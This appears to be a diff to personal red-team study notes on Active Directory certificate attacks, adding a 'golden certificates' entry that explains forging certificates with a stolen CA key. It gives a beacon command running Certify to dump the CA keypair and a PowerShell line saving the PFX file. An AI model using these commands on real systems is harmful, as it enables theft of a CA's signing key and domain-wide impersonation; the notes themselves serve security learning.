@@ -95,4 +95,10 @@ enumeration using certify
 6. golden certificates
     technique to extend privileged access to a CA server into unrestricted privileged across the entire domain
     if a CA server is compromised, we can extract the public and private keys used to sign and issue certs
-    
+    we can then use these to forge certs offline and sign them with a valid key (equivalent of having krbtgt key)
+    exploitation:
+        dump the keypair in PFX format
+            beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
+        save to our desktop for future use
+            PS C:\Users\Attacker> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\contoso-root-ca.pfx", [Convert]::FromBase64String("PFX"))
+        
